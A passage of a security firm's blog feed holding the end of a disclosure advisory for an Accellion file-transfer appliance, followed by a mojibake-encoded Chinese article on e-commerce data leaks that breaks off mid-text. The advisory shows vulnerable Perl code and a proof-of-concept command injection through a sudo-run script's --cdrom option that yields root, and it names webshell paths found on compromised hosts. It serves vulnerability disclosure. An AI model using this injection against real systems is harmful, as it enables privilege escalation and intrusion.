   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$download_only&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$clearcache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;cdrom=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;appid=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$appid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;servername=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$servername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;version=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;token=s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/usr/bin/yum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# if this is based on RHEL 5, change the repository&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;grep -q 5 /etc/redhat-release &amp;amp;&amp;amp; echo -n 5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;`;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/home/seos/log/yum-client.log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$STATUSFILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/home/seos/log/yum-client.status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMCONFIG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/etc/yum.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$YUMDIFF_FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/home/seos/log/yum.diff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&apos;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$OS&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;){&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -c &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/yum.conf-5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;nv&quot;&gt;$YUM_CMD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$YUM_CMD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -c &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/yum.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mkdir -p /mnt/cdrom &amp;amp;&amp;amp; mount -o loop &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$cdrom_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;fdielog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;unable to mount: $!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After taking a closer look on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ymm-client.pl&lt;/code&gt;, a Command Injection vulnerability was found on the parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--cdrom&lt;/code&gt;. This vulnerability enables attackers to inject any commands into the parameter and execute as root.&lt;/p&gt;

&lt;p&gt;Thus, using the commands below&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/bin/yum-client.pl &lt;span class=&quot;nt&quot;&gt;--cdrom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;$(id &amp;gt; /tmp/.gg)&apos;&lt;/span&gt;

mount: can&lt;span class=&quot;s1&quot;&gt;&apos;t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.

bash-3.2$ cat /tmp/.gg
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;will grant execution freely as root!&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;backdoor&quot;&gt;Backdoor&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
After gaining the highest privilege and carrying out server recon, we identified that several backdoors had been already planted in FTA hosts. One of them is an IRC Botnet which had been mentioned in Niaraâ€™s &lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Accellion File Transfer Appliance Vulnerability&lt;/a&gt;.&lt;br /&gt;
Apart from that, two additional PHP Webshells of different types which had NEVER been noted in public reports were also identified. Through reviewing Apache Log, these backdoors might be placed by exploiting the CVE-2015-2857 vulnerability discovered in mid-2015.&lt;/p&gt;

&lt;p&gt;One of the backdoors is PHPSPY, it is found on 62 of the online hosts globally. It was placed in&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/Redirector_Cache.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The other is WSO, found on 9 of the online hosts globally, placed in&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://&amp;lt;fta&amp;gt;/courier/themes/templates/imag.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h3&gt;
&lt;p&gt;&lt;br /&gt;
The vulnerability mentioned in this Advisory was identified in early 2016 while looking for vulnerabilities in Facebook, you can refer to the article â€œ&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someoneâ€™s Backdoor Script&lt;/a&gt;â€.&lt;br /&gt;
Upon discovering the FTA vulnerability in early February, I notified Facebook and Accellion and both were very responsive. Accellion responded immediately, issuing patch FTA_9_12_40 on February 12th and notifying all affected customers about the vulnerability and instructions to install the patch. Accellion has been very communicative and cooperative throughout this process.&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Feb  6, 2016 05:21 Contact Accellion for vulnerability report&lt;/li&gt;
  &lt;li&gt;Feb  7, 2016 12:35 Send the report to Accellion Support Team&lt;/li&gt;
  &lt;li&gt;Mar  3, 2016 03:03 Accellion Support Team notifies patch will be made in FTA_9_12_40&lt;/li&gt;
  &lt;li&gt;May 10, 2016 15:18 Request Advisory submission approval and report the new discovery of two backdoors to Accellion&lt;/li&gt;
  &lt;li&gt;Jun  6, 2016 10:20 Advisory finalized by mutual consent&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt; &lt;a name=&quot;ref1&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/resources/advisories/R7-0039.jsp&quot;&gt;Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities&lt;/a&gt; &lt;a name=&quot;ref2&quot;&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf&quot;&gt;Threat Advisory: Accellion File Transfer Appliance Vulnerability&lt;/a&gt; &lt;a name=&quot;ref3&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/</link>
                <guid>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver</guid>
                <pubDate>Thu, 22 Sep 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>é›»å•†æ¥­è€…çš„è³‡å®‰å›°å¢ƒï¼Ÿ</title>
                <description>&lt;p&gt;å°ç£é›»å•†ç¶²ç«™è“¬å‹ƒç™¼å±•ï¼Œè±å¯Œçš„å€‹è³‡ã€é‡‘æµéƒ½å¸å¼•äº†æ”»æ“Šè€…ã€‚è¿‘æœŸåˆ‘äº‹å±€ 165 åè©é¨™ç¶²ç«™ä¸Šå¸¸çœ‹åˆ°å¾ˆå¤šé›»å•†ç¶²ç«™é¢è‡¨å€‹è³‡å¤–æ´©çš„å•é¡Œï¼Œæ–°èä¹Ÿä¸æ–·å ±å°æ°‘çœ¾å› ç‚ºå€‹è³‡å¤–æ´©è¢«è©é¨™é›†åœ˜é¨™å–éŒ¢è²¡ã€‚è³‡å®‰å•é¡Œæ˜¯é›»å•†æ¥­è€…é¢è‡¨åˆ°æœ€å¤§çš„å±æ©Ÿï¼Œæ°‘çœ¾ä¹Ÿå¾ˆæ†¤æ€’ç‚ºä»€éº¼é€™äº›ä¼æ¥­éƒ½ä¸è‚¯æŠŠè³‡å®‰åšå¥½ã€‚ä½†æˆ‘ç›¸ä¿¡ï¼Œé›»å•†ç¶²ç«™çš„æ¥­ä¸»ä¹Ÿæ˜¯æœ‰è‹¦é›£è¨€ã€‚ä¸å°‘ä¼æ¥­çŸ¥é“è©²æŠŠè³‡å®‰åšå¥½ï¼Œæœ‰äº›å¯èƒ½ä¸å¾—å…¶æ³•ï¼Œä¹Ÿå¯èƒ½ä»€éº¼éƒ½åšäº†ï¼Œå»é‚„æ˜¯ç„¡æ³•é˜²æ­¢è‡ªå·±çš„ç¶²ç«™å‡ºç¾åœ¨ 165 è©é¨™æ’è¡Œçš„æ¦œå–®ä¸Šã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å…§æ”¿éƒ¨è­¦æ”¿ç½² 165 åè©é¨™è«®è©¢å°ˆç·š æ°‘çœ¾é€šå ±é«˜é¢¨éšªè³£å ´æ’å
&lt;a href=&quot;http://165.gov.tw/loss_rank.aspx&quot;&gt;http://165.gov.tw/loss_rank.aspx&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å°æ–¼ç„¡å¿ƒæ–¼è³‡å®‰çš„æ¥­è€…ä¾†èªªï¼Œè¢«æ­éœ²é€™æ¨£çš„è³‡è¨Šæœƒæœ‰ä¸€å®šç¨‹åº¦çš„åŠ›é‡è¿«ä½¿ä»–å€‘æŠŠè³‡å®‰åšå¥½ã€‚ä½†å°æ–¼å·²ç¶“é¡§å…¨è³‡å®‰çš„æ¥­è€…ä¾†èªªï¼Œå‰‡æ˜¯æ‘¸ä¸è‘—é ­ç·’åˆ°åº•å€‹è³‡å¾å“ªé‚Šå¤–æ´©çš„ã€‚ä»Šå¤©æˆ‘å€‘å°±ä¾†è«‡è«‡ï¼Œåˆ°åº•é›»å•†ç¶²ç«™çš„è³‡å®‰å•é¡Œæ˜¯ä»€éº¼ï¼Œæ°‘çœ¾çš„å€‹è³‡åˆæ˜¯æ€éº¼å¤–æ´©çš„ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;é›»å•†ç¶²ç«™çš„å›°å¢ƒ&quot;&gt;é›»å•†ç¶²ç«™çš„å›°å¢ƒ&lt;/h3&gt;

&lt;p&gt;ç›®å‰é›»å•†ç¶²ç«™å¸¸è¦‹çš„å›°å¢ƒæœ‰å¹¾é»ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;è‡ªè¡Œé–‹ç™¼ç¶²ç«™å­˜åœ¨æ¼æ´&lt;/li&gt;
  &lt;li&gt;å§”å¤–é–‹ç™¼ç¶²ç«™å­˜åœ¨æ¼æ´ï¼Œä½†æ‰¿åŒ…å•†ä¸è™•ç†&lt;/li&gt;
  &lt;li&gt;å…§éƒ¨å“¡å·¥é›»è…¦é­å…¥ä¾µå¤–æ´©å€‹è³‡&lt;/li&gt;
  &lt;li&gt;é…åˆå» å•†å€‹è³‡å¤–æ´©ï¼Œå¦‚é‡‘æµå•†ã€ç‰©æµå•†&lt;/li&gt;
  &lt;li&gt;æ”»æ“Šè€…ç”¨å·²å¤–æ´©å¸³è™Ÿå¯†ç¢¼ç™»å…¥é›»å•†ç¶²ç«™&lt;/li&gt;
  &lt;li&gt;è²·å®¶åœ¨è©é¨™é›†åœ˜çš„è³£å ´äº¤æ˜“&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;é»‘è‰²ç”¢æ¥­çš„ç™¼å±•æ¯”å¤§å®¶æƒ³åƒä¸­éƒ½é‚„è¦ç››è¡Œï¼Œè‹¥ä¼æ¥­å°æ”»æ“Šè€…ä¾†èªªæœ‰åˆ©å¯åœ–ï¼Œé§­å®¢çµ„ç¹”æœƒä¸æ“‡æ‰‹æ®µå…¥ä¾µå–å¾—è³‡æ–™ã€‚å› æ­¤å°ç¶²ç«™æœ¬èº«ã€ç¶²ç«™å‘¨é­ç³»çµ±ã€ä¼æ¥­å…§éƒ¨å“¡å·¥ã€æˆ–è€…ä»¥ç¤¾äº¤å·¥ç¨‹æ‰‹æ³•ï¼Œåªè¦èƒ½å–å¾—è³‡æ–™éƒ½æœƒæ˜¯ä»–å€‘ä¸‹æ‰‹çš„ç›®æ¨™ã€‚&lt;/p&gt;

&lt;h4 id=&quot;è‡ªè¡Œé–‹ç™¼ç¶²ç«™å­˜åœ¨æ¼æ´&quot;&gt;è‡ªè¡Œé–‹ç™¼ç¶²ç«™å­˜åœ¨æ¼æ´&lt;/h4&gt;

&lt;p&gt;é€™æ˜¯ç›®å‰ä¼æ¥­æœ€éœ€è¦å…ˆè§£æ±ºçš„å•é¡Œã€‚è‹¥ç¶²ç«™æœ¬èº«è³‡å®‰é«”è³ªä¸å¥½ï¼Œå‰‡æœƒè¼•æ˜“è¢«æ”»æ“Šè€…å…¥ä¾µã€‚è³‡å®‰å•é¡Œå¾€å¾€éƒ½æ˜¯ä¼æ¥­å…§éƒ¨æœ€é›£è§£çš„å•é¡Œï¼Œé“é«˜ä¸€å°ºé­”é«˜ä¸€ä¸ˆï¼Œè‹¥æ²’æœ‰ç¶“éå®Œæ•´çš„&lt;a href=&quot;https://devco.re/services/penetration-test/&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;ï¼Œå‰‡é›£ä»¥æ‰¾å‡ºå•é¡Œçš„æ ¹æºã€‚æ‰¾åˆ°äº†å•é¡Œä¹‹å¾Œï¼Œé–‹ç™¼äººå“¡çš„æ•™è‚²è¨“ç·´ã€è³‡å®‰æ©Ÿåˆ¶ã€è³‡å®‰è¨­å‚™ï¼Œéƒ½æœƒæ˜¯ä¼æ¥­æ¥ä¸‹ä¾†è¦é¢å°çš„èª²é¡Œã€‚&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ¡ˆï¼šæ»²é€æ¸¬è©¦ã€è³‡å®‰é¡§å•ã€æ•™è‚²è¨“ç·´&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;å§”å¤–é–‹ç™¼ç¶²ç«™å­˜åœ¨æ¼æ´ä½†æ‰¿åŒ…å•†ä¸è™•ç†&quot;&gt;å§”å¤–é–‹ç™¼ç¶²ç«™å­˜åœ¨æ¼æ´ï¼Œä½†æ‰¿åŒ…å•†ä¸è™•ç†&lt;/h4&gt;

&lt;p&gt;ä¸å°‘ä¼æ¥­æ²’æœ‰è‡ªå·±é–‹ç™¼ç¶²ç«™ï¼Œè€Œæ˜¯ç™¼åŒ…çµ¦å¤–éƒ¨å» å•†é–‹ç™¼ã€ç¶­é‹ã€‚æ‰¿åŒ…å•†çš„å“è³ªé€šå¸¸é›£ä»¥æŒæ§ï¼Œåƒ¹æ ¼æˆ°çš„æ¥­ç•Œç”Ÿæ…‹ï¼Œæ›´è®“é–‹ç™¼çš„å“è³ªé›£ä»¥æå‡ã€‚ä½†æ¥­è€…æœ€é ­å¤§çš„æ˜¯ï¼šæ‰¿åŒ…å•†æ‹’çµ•è™•ç†æ¼æ´ã€‚è‹¥æ²’æœ‰åœ¨ä¸€é–‹å§‹çš„å§”å¤–åˆç´„å°±æ˜è¨‚è³‡å®‰ç¶­è­·æ¨™æº–ï¼Œåœ¨æ—¥å¾Œç™¼ç”Ÿè³‡å®‰äº‹ä»¶æ™‚å‰‡é›£ä»¥è¦æ±‚æ‰¿åŒ…å•†ä¿®è£œæ¼æ´ã€‚å› æ­¤å»ºè­°æ¥­è€…åœ¨æ—¥å¾Œçš„å§”å¤–é–‹ç™¼æ¡ˆï¼Œæ˜è¨‚è³‡å®‰æ¨™æº–ã€é©—æ”¶æ™‚æª¢é™„ç¬¬ä¸‰æ–¹æ»²é€æ¸¬è©¦å ±å‘Šï¼Œä¸¦ä¸”å°‡æ—¥å¾Œè³‡å®‰ç¶­è­·åˆç´„ç¨ç«‹æ–¼ä¸€èˆ¬ç¶­è­·ç´„ä¹‹å¤–ï¼Œå¼·åˆ¶åŸ·è¡Œã€‚&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ¡ˆï¼šé¸å•†æ¨™æº–ã€é–‹æ¨™è¦æ ¼ã€é©—æ”¶æ¨™æº–ã€è³‡å®‰ç¶­è­·åˆç´„&lt;/p&gt;

&lt;h4 id=&quot;å…§éƒ¨å“¡å·¥é›»è…¦é­å…¥ä¾µå¤–æ´©å€‹è³‡&quot;&gt;å…§éƒ¨å“¡å·¥é›»è…¦é­å…¥ä¾µå¤–æ´©å€‹è³‡&lt;/h4&gt;

&lt;p&gt;é™¤äº†ä¼ºæœå™¨ä¹‹å¤–ï¼Œå®¢æˆ¶ç«¯ä¹Ÿæ˜¯æ”»æ“Šè€…ä¸‹æ‰‹çš„ç›®æ¨™ã€‚ç•¶ç¶²ç«™é›£ä»¥è¢«å…¥ä¾µï¼Œæ”»æ“Šè€…å°±æœƒè½‰å¾€å“¡å·¥é›»è…¦ä¸‹æ‰‹ã€‚é€éç¤¾äº¤å·¥ç¨‹ã€æ­é…æƒ¡æ„éƒµä»¶ç­‰ APT æ”»æ“Šï¼Œå…¥ä¾µå€‹äººé›»è…¦å¾Œå–å¾—æ¶ˆè²»è€…å€‹è³‡ï¼Œç”šè‡³åšç‚ºè·³æ¿æ»²é€ä¼æ¥­å…§éƒ¨æ“´å¤§æ”»æ“Šæˆæœã€‚è‹¥æ²’æœ‰è¶³å¤ çš„è³‡å®‰æ„è­˜ï¼Œå“¡å·¥å°‡æœƒæ˜¯ä¼æ¥­æœ€å¤§çš„è³‡å®‰ç¼ºå£ã€‚&lt;/p&gt;

&lt;p&gt;è§£æ±ºæ–¹æ¡ˆï¼šå¼·åŒ–è³‡å®‰æ€ç¶­ã€æ¬Šé™æœ€å°åŒ–ã€APT é˜²ç¦¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160729/the_security_dilemma_of_e-commerce_2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;é…åˆå» å•†å€‹è³‡å¤–æ´©å¦‚é‡‘æµå•†ç‰©æµå•†&quot;&gt;é…åˆå» å•†å€‹è³‡å¤–æ´©ï¼Œå¦‚é‡‘æµå•†ã€ç‰©æµå•†&lt;/h4&gt;

